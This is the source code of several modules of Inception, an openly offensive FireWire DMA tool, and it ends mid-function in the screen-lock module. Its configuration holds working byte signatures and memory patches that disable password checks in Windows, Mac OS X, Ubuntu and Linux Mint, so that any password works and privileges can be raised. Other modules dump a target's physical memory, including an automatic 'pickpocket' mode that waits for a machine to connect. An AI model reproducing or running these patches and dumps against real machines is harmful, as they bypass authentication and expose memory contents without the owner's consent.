__FILENAME__ = cfg
'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Sep 6, 2011

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
#pylint: disable-msg=C0103,C0301
from textwrap import TextWrapper

#===============================================================================
# General information
#===============================================================================
version = '0.3.5'
url = 'http://breaknenter.org/projects/inception'

#===============================================================================
# Global objects
#===============================================================================
wrapper = TextWrapper(subsequent_indent = ' ' * 4)

#===============================================================================
# Constants
#===============================================================================
DEBUG = 0                           # Debug off
KiB = 1024                          # One KibiByte
MiB = 1024 * KiB                    # One MebiByte
GiB = 1024 * MiB                    # One GibiByte
PAGESIZE = 4 * KiB                  # For the sake of this tool, always the case
OUICONF = 'resources/oui.txt'       # FireWire OUI database relative to package
LINUX = 'Linux'
OSX = 'Darwin'
WINDOWS = 'Windows'
    
#===============================================================================
# Global variables/default settings
#===============================================================================
verbose = False                 # Not verbose
fw_delay = 5                    # 5 seconds delay before attacking
filemode = False                # Search in file instead of FW DMA
dry_run = False                 # No write-back into memory
target = False                  # No target set
filename = ''                   # No filename set per default
buflen = 15                     # Buffer length for checking if we get data
memsize = 4 * GiB               # 4 GiB, theoretical FW max
success = True                  # Optimistic-by-nature setting
encoding = None                 # System encoding
vectorsize = 128                # Read vector size
memdump = False                 # Memory dump mode off
startaddress = MiB              # Default memory start address
dumpsize = False                # Not set by default
interactive = False             # Interactive mode off
max_request_size = PAGESIZE//2  # By default the max request size is the PSZ/2
avoid = False                   # Do we need to avoid certain regions of memory?
pc_avoid = [0xa0000, 0xfffff]   # Upper Win memory area (can cause BSOD if accessed)
apple_avoid = [0x0, 0xff000]    # Avoid this area if dumping memory from Macs
apple_target = False            # Set to true if we are attacking a Mac
pickpocket = False              # Pickpocket mode off by default
patchfile = ''                  # Read patch from file instead of the one from targets
revert = False                  # Revert the patch after we are done
polldelay = 1                   # 1 second delay between FireWire polls
os = None                       # Detected host OS is None by default
forcewrite = False              # Do not write back to file in file mode
list_signatures = False         # Don't list all signatures at startup
memdump_prefix = 'inceptiondump'# Prefix for memory dump file
memdump_ext = 'bin'             # Binary extesnion for memory dumps

#===============================================================================
# Targets are collected in a list of dicts using the following syntax:
# [{'OS': 'OS 1 name' # Used for matching and OS guessing
#  'versions': ['SP0', 'SP2'],
#  'architecture': 'x86',
#  'name': 'Target 1 name',
#  'notes': 'Target 1 notes',
#  'signatures': [
#                 # 1st signature. Signatures are in an ordered list, and are
#                 # searched for in the sequence listed. If not 'keepsearching'
#                 # key is set, the tool will stop at the first match & patch.
#                 {'offsets': 0x00, # Relative to page boundary
#                  'chunks': [{'chunk': 0x00, # Signature to search for
#                              'internaloffset': 0x00, # Relative to offset
#                              'patch': 0xff, # Patch data
#                              'patchoffset': 0x00}]}, # Patch at an offset
#                 # 2nd signature. Demonstrates use of several offsets that
#                 # makes it easier to match signatures where the offset change
#                 # often. Also demonstrates split signatures; where the tool
#                 # matches that are split over several blobs of data. The
#                 # resulting patch below is '0x04__05' where no matching is
#                 # done for the data represented by '__'.
#                 {'offsets': [0x01, 0x02], # Signatures can have several offs
#                  'chunks': [{'chunk': 0x04, # 1st part of signature
#                              'internaloffset': 0x00,
#                              'patch': 0xff, # Patch data for the 1st part
#                              'patchoffset': 0x03}, # Patch at an offset
#                             {'chunk': 0x05, # 2nd part of signature
#                              'internaloffset': 0x02, # Offset relative to sig
#                              'patch': 0xff}]}]}] # Patch data for the 2nd part
#
# Key 'patchoffset' is optional and will be treated like 'None' if not 
# provided.
#
# OS key should follow the rudimentary format 'Name Version'
#
# Example signature with graphical explanation:
#
# 'signatures': [{'offsets': 0x01,
#                          'chunks': [{'chunk': 0xc60f85,
#                                      'internaloffset': 0x00},
#                                     {'chunk': 0x0000b8,
#                                      'internaloffset': 0x05,
#                                      'patch': 0xb001,
#                                      'patchoffset': 0x0a}]}]},
# 
# EQUALS:
#
#   |-- Offset 0x00                     
#  /                                           
# /\             |-patchoffset--------------->[b0 01]   
# 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f .. (byte offset)
# -----------------------------------------------
# c6 0f 85 a0 b8 00 00 b8 ab 05 03 ff ef 01 00 00 .. (chunk of memory data)
# -----------------------------------------------
# \______/ \___/ \______/
#     \      \       \
#      \      \       |-- Chunk 2 at internaloffset 0x05
#       \      |-- Some data (ignore, don't match this)
#        |-- Chunk 1 at internaloffset 0x00
# \_____________________/
#            \
#             |-- Entire signature
#
#===============================================================================

targets = [{'OS': 'Windows 8',
            'versions': ['8.0', '8.1'],
            'architectures': ['x86', 'x64'],
            'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
            'notes': 'Ensures that the password-check always returns true. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
            'signatures': [{'offsets': [0xde7], # x86 8.0
                            'chunks': [{'chunk': 0x8bff558bec81ec90000000a1,
                                        'internaloffset': 0x00,
                                        'patch': 0xb001, # nops
                                        'patchoffset': 0xc1}]}, # 0xc1
                           {'offsets': [0xca0], # x86 8.1
                            'chunks': [{'chunk': 0x8bff558bec81ec90000000a1,
                                        'internaloffset': 0x00,
                                        'patch': 0x909090909090, # nops
                                        'patchoffset': 0xb3}]},
                           {'offsets': [0x208, 0xd78], # x64 8.0, 8.1
                            'chunks': [{'chunk': 0xc60f85,
                                        'internaloffset': 0x00,
                                        'patch': 0x909090909090,
                                        'patchoffset': 0x01},
                                       {'chunk': 0x66b80100,
                                        'internaloffset': 0x07}]}]},
           {'OS': 'Windows 7',
            'versions': ['SP0', 'SP1'],
            'architectures': ['x86', 'x64'],
            'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
            'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of the entered password, the account will be locked out of any Windows AD domain he/she was member of at this machine.',
            'signatures': [{'offsets': [0x2a8, 0x2a1, 0x291, 0x321], # x64 SP0-SP1
                            'chunks': [{'chunk': 0xc60f85,
                                        'internaloffset': 0x00,
                                        'patch': 0x909090909090,
                                        'patchoffset': 0x01},
                                       {'chunk': 0xb8,
                                        'internaloffset': 0x07}]},
                           {'offsets': [0x926], # x86 SP0
                            'chunks': [{'chunk': 0x83f8107513b0018b,
                                        'internaloffset': 0x00,
                                        'patch': 0x83f8109090b0018b,
                                        'patchoffset': 0x00}]},
                           {'offsets': [0x312], # x86 SP1
                            'chunks': [{'chunk': 0x83f8100f8550940000b0018b,
                                        'internaloffset': 0x00,
                                        'patch': 0x83f810909090909090b0018b,
                                        'patchoffset': 0x00}]}]},
           {'OS': 'Windows Vista',
            'versions': ['SP0', 'SP2'],
            'architectures': ['x86', 'x64'],
            'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
            'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of the entered password, the account will be locked out of any Windows AD domain he/she was member of at this machine.',
            'signatures': [{'offsets': [0x1a1], # x64 SP2
                            'chunks': [{'chunk': 0xc60f85,
                                        'internaloffset': 0x00,
                                        'patch': 0x909090909090,
                                        'patchoffset': 0x01},
                                       {'chunk': 0xb8,
                                        'internaloffset': 0x07}]},
                           {'offsets': [0x432, 0x80f, 0x74a], # SP0, SP1, SP2 x86
                            'chunks': [{'chunk': 0x83f8107513b0018b,
                                        'internaloffset': 0x00,
                                        'patch': 0x83f8109090b0018b,
                                        'patchoffset': 0x00}]}]},
           {'OS': 'Windows XP',
            'versions': ['SP2', 'SP3'],
            'architectures': ['x86'],
            'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
            'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of the entered password, the account will be locked out of any Windows AD domain he/she was member of at this machine.',
            'signatures': [{'offsets': [0x862, 0x8aa, 0x946, 0x126, 0x9b6], # SP2-3 x86
                            'chunks': [{'chunk': 0x83f8107511b0018b,
                                        'internaloffset': 0x00,
                                        'patch': 0x83f8109090b0018b,
                                        'patchoffset': 0x00}]}]},
           {'OS': 'Mac OS X',
            'versions': ['10.6.4', '10.6.8', '10.7.3', '10.8.2', '10.8.4', '10.9'],
            'architectures': ['x86', 'x64'],
            'name': 'DirectoryService/OpenDirectory unlock/privilege escalation',
            'notes': 'Overwrites the DoShadowHashAuth/ODRecordVerifyPassword return value. After running, all local authentications (e.g., GUI, sudo, etc.) will work with all non-blank passwords',
            'signatures': [{'offsets': [0x7cf], # 10.6.4 x64
                            'chunks': [{'chunk': 0x41bff6c8ffff48c78588,
                                        'internaloffset': 0x00,
                                        'patch': 0x41bf0000000048c78588,
                                        'patchoffset': 0x00}]},
                           {'offsets': [0xbff], # 10.6.8 x64
                            'chunks': [{'chunk': 0x41bff6c8ffff,
                                        'internaloffset': 0x00,
                                        'patch': 0x41bf00000000,
                                        'patchoffset': 0x00}]},
                           {'offsets': [0x82f], # 10.6.8 x32
                            'chunks': [{'chunk': 0xc78580f6fffff6c8ffff,
                                        'internaloffset': 0x00,
                                        'patch': 0xc78580f6ffff00000000,
                                        'patchoffset': 0x00}]},
                           {'offsets': [0xfa7], # 10.7.3 x64
                            'chunks': [{'chunk': 0x0fb6,
                                        'internaloffset': 0x00,
                                        'patch': 0x31dbffc3, # xor ebx,ebx; inc ebx;
                                        'patchoffset': 0x00},
                                       {'chunk': 0x89d8eb0231c04883c4785b415c415d415e415f5dc3,
                                        'internaloffset': 0x0e}]},
                           {'offsets': [0x334], # 10.8.2 x64, 10.8.3, 10.8.4
                            'chunks': [{'chunk': 0x88d84883c4685b415c415d415e415f5d,
                                        'internaloffset': 0x00,
                                        'patch': 0xb001, # mov al,1;
                                        'patchoffset': 0x00}]},
                           {'offsets': [0x1e5], # 10.9
                            'chunks': [{'chunk': 0x4488e84883c4685b415c415d415e415f5d,
                                        'internaloffset': 0x00,
                                        'patch': 0x90b001, # nop; mov al,1;
                                        'patchoffset': 0x00}]}]},
           {'OS': 'Ubuntu',
            'versions': ['11.04', '11.10', '12.04', '12.10', '13.04', '13.10'],
            'architectures': ['x86', 'x64'],
            'name': 'libpam unlock/privilege escalation',
            'notes': 'Overwrites the pam_authenticate return value. After running, all PAM-based authentications (e.g., GUI, tty and sudo) will work with no password.',
            'signatures': [{'offsets': [0xa6d, 0xebd, 0x9ed, 0xbaf, 0xa7f], # 10.10, 10.04, 11.10, 11.04, 12.04 x86
                            'chunks': [{'chunk': 0x83f81f89c774,
                                        'internaloffset': 0x00,
                                        'patch': 0xbf00000000eb,
                                        'patchoffset': 0x00}]},
                           {'offsets': [0xb46, 0xcae, 0xc95], # 12.10, 13.04, 13.10 x86
                            'chunks': [{'chunk': 0xe8,
                                        'internaloffset': 0x00},
                                       {'chunk': 0x83f81f,
                                        'internaloffset': 0x05,
                                        'patch': 0x9031c0, # nop; xor eax,eax
                                        'patchoffset': 0x00}]},
                           {'offsets': [0x838, 0x5b8, 0x3c8], # 11.10, 11.04, 12.04 x64
                            'chunks': [{'chunk': 0x83f81f89c574,
                                        'internaloffset': 0x00,
                                        'patch': 0xbd00000000eb,
                                        'patchoffset': 0x00}]},
                           {'offsets': [0x4aa, 0x69b, 0x688], # 12.10, 13.04, 13.10 x64
                            'chunks': [{'chunk': 0xe8,
                                        'internaloffset': 0x00},
                                       {'chunk': 0x83f81f,
                                        'internaloffset': 0x05,
                                        'patch': 0x6631c0, # xor eax,eax
                                        'patchoffset': 0x00}]}]},
           {'OS': 'Linux Mint',
            'versions': ['11', '12', '13'],
            'architectures': ['x86', 'x64'],
            'name': 'libpam unlock/privilege escalation',
            'notes': 'Overwrites pam_authenticate return value. After running, all PAM-based authentications (e.g., GUI, tty and sudo) will work with no password.',
            'signatures': [{'offsets': [0xebd, 0xbaf, 0xa7f],
                            'chunks': [{'chunk': 0x83f81f89c774,
                                        'internaloffset': 0x00,
                                        'patch': 0xbf00000000eb,
                                        'patchoffset': 0x00}]},
                           {'offsets': [0x838, 0x5b8, 0x3c8],
                            'chunks': [{'chunk': 0x83f81f89c574,
                                        'internaloffset': 0x00,
                                        'patch': 0xbd00000000eb,
                                        'patchoffset': 0x00}]}]}]

egg = False
eggs = []

########NEW FILE########
__FILENAME__ = debug
'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jan 14, 2013

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from inception import cfg
import pdb
import sys
import inspect
import logging

MAX_DEBUG = 3

def setup(level = 0):
    '''
    Sets up the global logging environment
    '''
    formatstr = '%(levelname)-8s: %(name)-20s: %(message)s'
    logging.basicConfig(format = formatstr)
    rootlogger = logging.getLogger('')
    rootlogger.setLevel(logging.DEBUG + 1 - level)
    for i in range(1, 9):
        logging.addLevelName(logging.DEBUG - i, 'DEBUG' + str(i))


def debug(msg, level = 1):
    '''
    Logs a message at the DEBUG level
    '''
    log(msg, logging.DEBUG + 1 - level)


def info(msg):
    '''
    Logs a message at the INFO level
    '''
    log(msg, logging.INFO)


def warn(msg):
    '''
    Logs a message at the WARNING level
    '''
    log(msg, logging.WARNING)


def error(msg):
    '''
    Logs a message at the ERROR level
    '''
    log(msg, logging.ERROR)
    sys.exit(1)


def critical(msg):
    '''
    Logs a message at the CRITICAL level
    '''
    log(msg, logging.CRITICAL)
    sys.exit(1)


def log(msg, level):
    '''
    Logs a message
    '''
    modname = 'inception'
    try:
        frm = inspect.currentframe()
        modname = 'inception.debug'
        while modname == 'inception.debug':
            frm = frm.f_back
            mod = inspect.getmodule(frm)
            modname = mod.__name__
    except AttributeError:
        pass
    finally:
        del frm
    _log(msg, modname, level)


def _log(msg, facility, loglevel):
    '''
    Outputs a debugging message
    '''
    logger = logging.getLogger(facility)
    logger.log(loglevel, msg)


def dbg(level = 1):
    '''
    Enters the debugger at the call point
    '''
    if cfg.DEBUG >= level:
        pdb.set_trace()


def post_mortem(level = 1):
    '''
    Provides a command line interface to python after an exception's occurred
    '''
    if cfg.DEBUG >= level:
        pdb.post_mortem()

########NEW FILE########
__FILENAME__ = exceptions
'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jan 14, 2013

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''

class InceptionException(Exception):
    '''
    Non... rien de rien
    Non je ne regrette rien
    Ni le bien... qu'on m'a fait
    Ni le mal, tout ça m'est bien égale...
    '''
    def __init__(self, message, Errors):

        # Call the base class constructor
        Exception.__init__(self, message)

        # Handle errors (for now assign to base class Errors)
        self.Errors = Errors
########NEW FILE########
__FILENAME__ = firewire
'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jan 23, 2012

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from inception import cfg, util, term
from subprocess import call
import os
import re
import sys
import time

# Error handling for cases where libforensic1394 is not installed in /usr/lib
try:
    from forensic1394.bus import Bus
except OSError:
    host_os = util.detectos()
    try:
        path = os.environ['LD_LIBRARY_PATH']
    except KeyError:
        path = ''
    # If the host OS is Linux, we may need to set LD_LIBRARY_PATH to make python
    # find the libs
    if host_os == cfg.LINUX and '/usr/local/lib' not in path:
        os.putenv('LD_LIBRARY_PATH', "/usr/local/lib")
        util.restart()
    else:
        term.fail('Could not load libforensic1394, try running inception as root')

# List of FireWire OUIs
OUI = {}

class FireWire:
    '''
    FireWire wrapper class to handle some attack-specific functions
    '''

    def __init__(self):
        '''
        Constructor
        Initializes the bus and sets device, OUI variables
        '''
        self._bus = Bus()
        try:
            self._bus.enable_sbp2()
        except IOError:
            if os.geteuid() == 0: # Check if we are running as root
                term.poll('FireWire modules are not loaded. Try loading them? [Y/n]: ')
                answer = input().lower()
                if answer in ['y', '']:
                    status_modprobe = call('modprobe firewire-ohci', shell=True)
                    status_rescan = call('echo 1 > /sys/bus/pci/rescan', shell=True)
                    if status_modprobe == 0 and status_rescan == 0:
                        try:
                            self._bus.enable_sbp2()
                        except IOError:
                            time.sleep(2) # Give some more time
                            try:
                                self._bus.enable_sbp2() # If this fails, fail hard
                            except IOError:
                                term.fail('Unable to detect any local FireWire ports. Please make ' +
                                          'sure FireWire is enabled in BIOS, and connected ' +
                                          'to this system. If you are using an adapter, please make ' +
                                          'sure it is properly connected, and re-run inception')
                        term.info('FireWire modules loaded successfully')
                    else:
                        term.fail('Could not load FireWire modules, try running inception as root')
                else:
                    term.fail('FireWire modules not loaded')
            else:
                term.fail('FireWire modules are not loaded and we have insufficient privileges ' +
                          'to load them. Try running inception as root')
                
        # Enable SBP-2 support to ensure we get DMA
        self._devices = self._bus.devices()
        self._oui = self.init_OUI()
        self._vendors = []
        self._max_request_size = cfg.PAGESIZE
        
        
    def init_OUI(self, filename = cfg.OUICONF):
        '''Populates the global OUI dictionary with mappings between 24 bit
        vendor identifier and a text string. Called during initialization. 
    
        Defaults to reading the value of module variable OUICONF.
        The file should have records like
        08-00-8D   (hex)                XYVISION INC.
    
        Feed it the standard IEEE public OUI file from
        http://standards.ieee.org/regauth/oui/oui.txt for a more up to date 
        listing.
        '''
        OUI = {}
        try:
            f = util.open_file(filename, 'r')
            lines = f.readlines()
            f.close()
            regex = re.compile('(?P<id>([0-9a-fA-F]{2}-){2}[0-9a-fA-F]{2})' + 
                               '\s+\(hex\)\s+(?P<name>.*)')
            for l in lines:
                rm = regex.match(l)
                if rm != None:
                    textid = rm.groupdict()['id']
                    ouiid = int('0x%s%s%s' % (textid[0:2], textid[3:5], 
                                              textid[6:8]), 16)
                    OUI[ouiid] = rm.groupdict()['name']
        except IOError:
            term.warn('Vendor OUI lookups will not be performed: {0}'
                 .format(filename))
        return OUI
    
            
    def resolve_oui(self, vendor):
        try:
            return self._oui[vendor]
        except KeyError:
            return ''
        
            
    def businfo(self):
        '''
        Prints all available information of the devices connected to the FW
        bus, looks up missing vendor names & populates the internal vendor
        list
        '''
        if not self._devices:
            term.fail('Could not detect any FireWire devices connected to this system')
        term.info('FireWire devices on the bus (names may appear blank):')
        term.separator()
        for n, device in enumerate(self._devices, 1):
            vid = device.vendor_id
            # In the current version of libforensic1394, the 
            # device.vendor_name.decode() method cannot be trusted (it often
            # returns erroneous data. We'll rely on OUI lookups instead
            # vendorname = device.vendor_name.decode(cfg.encoding)
            vendorname = self.resolve_oui(vid)
            self._vendors.append(vendorname)
            pid = device.product_id
            productname = device.product_name.decode(cfg.encoding)
            term.info('Vendor (ID): {0} ({1:#x}) | Product (ID): {2} ({3:#x})'
                      .format(vendorname, vid, productname, pid), sign = n)
        term.separator()

    def select_device(self):
        selected = self.select()
        vendor = self._vendors[selected]
        # Print selection
        term.info('Selected device: {0}'.format(vendor))
        return selected
        
    
    def select(self):
        '''
        Present the user of the option to select what device (connected to the
        bus) to attack
        '''
        if not self._vendors:
            self.businfo()
        nof_devices = len(self._vendors)
        if nof_devices == 1:
            if cfg.verbose:
                term.info('Only one device present, device auto-selected as ' +
                          'target')
            return 0
        else:
            term.poll('Select a device to attack (or type \'q\' to quit): ')
            selected = input().lower()
            try:
                selected = int(selected)
            except:
                if selected == 'q': sys.exit()
                else:
                    term.warn('Invalid selection. Type \'q\' to quit')
                    return self.select()
        if 0 < selected <= nof_devices:
            return selected - 1
        else:
            term.warn('Enter a selection between 1 and ' + str(nof_devices) + 
                      '. Type \'q\' to quit')
            return self.select()
        
        
    def getdevice(self, num, elapsed):
        didwait = False
        bb = term.BeachBall()
        try:
            for i in range(cfg.fw_delay - elapsed, 0, -1):
                print('[*] Initializing bus and enabling SBP-2, ' +
                      'please wait %2d seconds or press Ctrl+C\r' 
                      % i, end = '')
                sys.stdout.flush()
                bb.draw()
                didwait = True
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        d = self._bus.devices()[num]
        d.open()
        if didwait: 
            print() # Create a LF so that next print() will start on a new line
        return d
            
            
    @property
    def bus(self):
        '''
        The firewire bus; Bus.
        '''
        return self._bus
    
    
    @property
    def devices(self):
        '''
        The firewire devices connected to the bus; list of Device.
        '''
        self._devices = self._bus.devices()
        return self._devices
    
    
    @property
    def oui(self):
        '''
        The OUI dict
        '''
        return self._oui
    
    
    @property
    def vendors(self):
        '''
        The list of vendors
        '''
        return self._vendors


########NEW FILE########
__FILENAME__ = memdump
'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jan 22, 2012

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''

from inception import cfg, firewire, util, term
import time

filename = ''

def dump(start, end):
    # Ensure that the filename is accessible outside this module
    global filename

    # Make sure that the right mode is set
    cfg.memdump = True
    
    requestsize = cfg.max_request_size
    size = end - start
    
    # Open file for writing
    timestr = time.strftime("%Y%m%d-%H%M%S")
    filename = '{0}_{1}-{2}_{3}.{4}'.format(cfg.memdump_prefix, 
                                            hex(start), hex(end),
                                            timestr,
                                            cfg.memdump_ext)
    file = open(filename, 'wb')
    
    # Ensure correct denomination
    if size % cfg.GiB == 0:
        s = '{0} GiB'.format(size//cfg.GiB)
    elif size % cfg.MiB == 0:
        s = '{0} MiB'.format(size//cfg.MiB)
    else:
        s = '{0} KiB'.format(size//cfg.KiB)
        
    term.info('Dumping from {0:#x} to {1:#x}, a total of {2}'
              .format(start, end, s))
    
    # Initialize and lower DMA shield
    if not cfg.filemode:
        fw = firewire.FireWire()
        starttime = time.time()
        device_index = fw.select_device()
        # Print selection
        term.info('Selected device: {0}'.format(fw.vendors[device_index]))

    # Lower DMA shield or use a file as input
    device = None
    if cfg.filemode:
        device = util.MemoryFile(cfg.filename, cfg.PAGESIZE)
    else:
        elapsed = int(time.time() - starttime)
        device = fw.getdevice(device_index, elapsed)

    # Progress bar
    prog = term.ProgressBar(min_value = start, max_value = end, 
                            total_width = cfg.wrapper.width, 
                            print_data = cfg.verbose)


    try:
        # Fill the first MB and avoid reading from that region
        if not cfg.filemode:
            fillsize = cfg.startaddress - start
            data = b'\x00' * fillsize
            file.write(data)
            start = cfg.startaddress
        for i in range(start, end, requestsize):
            # Edge case, make sure that we don't read beyond the end
            if  i + requestsize > end:
                requestsize = end - i
            data = device.read(i, requestsize)
            file.write(data)
            # Print status
            prog.update_amount(i + requestsize, data)
            prog.draw()
        file.close()
        print() # Filler
        term.info('Dumped memory to file {0}'.format(filename))
        device.close()
    except KeyboardInterrupt:
        file.close()
        print()
        term.info('Dumped memory to file {0}'.format(filename))
        raise KeyboardInterrupt

########NEW FILE########
__FILENAME__ = pickpocket
'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Feb 1, 2012

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''

from inception import firewire, memdump, cfg, term
import time

def lurk():
    '''
    Wait for devices to connect to the FireWire bus, and attack when they do
    '''
    start = cfg.startaddress
    end = cfg.memsize
    bb = term.BeachBall()
    
    try:
        s = '\n'.join(cfg.wrapper.wrap('[-] Lurking in the shrubbery ' +
                                        'waiting for a device to connect. ' +
                                        'Ctrl-C to abort')) + '\r'
        print(s, end = '')
        
        # Initiate FireWire
        fw = firewire.FireWire()
        while True: # Loop until aborted, and poll for devices
            while len(fw.devices) == 0:
                # Draw a beach ball while waiting
                bb.draw()
                time.sleep(cfg.polldelay)

            print() # Newline 
            term.info('FireWire device detected')
            memdump.dump(start, end)
            
    except KeyboardInterrupt:
        print() # TODO: Fix keyboard handling (interrupt handling)
        raise KeyboardInterrupt
        

########NEW FILE########
__FILENAME__ = screenlock
'''
Inception - a FireWire physical memory manipulation and hacking tool exploiting
IEEE 1394 SBP-2 DMA.

Copyright (C) 2011-2013  Carsten Maartmann-Moe

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

Created on Jun 23, 2011

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy
'''
from inception import firewire, cfg, sound, util, term
import os
import sys
import time


def select_target(targets, selected=False):
    '''
    Provides easy selection of targets. Input is a list of targets (dicts)
    '''
    if len(targets) == 1:
        term.info('Only one target present, auto-selected')
        return targets[0]
    if not selected:
        term.poll('Please select target (or enter \'q\' to quit):')
        selected = input()
    nof_targets = len(targets)
    try:
        selected = int(selected)
    except:
        if selected == 'q': sys.exit()
        else:
            term.warn('Invalid selection, please try again. Type \'q\' to quit')
            return select_target(targets)
    if 0 < selected <= nof_targets:
        return targets[selected - 1]
    else:
        term.warn('Please enter a selection between 1 and ' + str(nof_targets) + 
                  '. Type \'q\' to quit')
        return select_target(targets)
    

def printdetails(target): # TODO: Fix this fugly method
    '''
    Prints details about a target
    '''
    term.info('The target module contains the following signatures:')
    term.separator()
    print('\tVersions:\t' + ', '.join(target['versions']).rstrip(', '))
    print('\tArchitectures:\t' + ', '
          .join(target['architectures']).rstrip(', '))
    for signature in target['signatures']:
        offsets = '\n\t\tOffsets:\t'
        for offset in signature['offsets']:
            offsets += hex(offset)
            if not offset is signature['offsets'][-1]: offsets += ', '
        print(offsets)
        sig = '\t\tSignature:\t0x'
        ioffs = 0
        patch = 0
        poffs = 0
        for chunk in signature['chunks']:
            diff = chunk['internaloffset'] - util.bytelen(chunk['chunk']) - 1 - ioffs
            sig += '__' * diff
            ioffs = chunk['internaloffset']
            sig += '{0:x}'.format(chunk['chunk'])
            try:
                patch = chunk['patch']
                poffs = chunk['patchoffset']
            except KeyError: pass
        print(sig)
        print('\t\tPatch:\t\t{0:#x}'.format(patch))
        print('\t\tPatch offset:\t{0:#x}'.format(poffs))
        
    term.separator()
    
    
def list_targets(targets, details=False):
    term.info('Available targets (known signatures):')
    term.separator()
    for number, target in enumerate(targets, 1):
                term.info(target['OS'] + ': ' + target['name'], sign = number)
                if details:
                    printdetails(target)
    if not details: # Avoid duplicate separator
        term.separator()
    

def siglen(l):
    '''
    Accepts dicts with key 'internaloffset', and calculates the length of the 
    total signature in number of bytes
    '''
    index = value = 0
    for i in range(len(l)):
        if l[i]['internaloffset'] > value:
            value = l[i]['internaloffset']
            index = i
    # Must decrement bytelen with one since byte positions start at zero
    return util.bytelen(l[index]['chunk']) - 1 + value


def match(candidate, chunks):
    '''
    Matches a candidate read from memory with the signature chunks
    '''
    for c in chunks:
        ioffset = c['internaloffset']
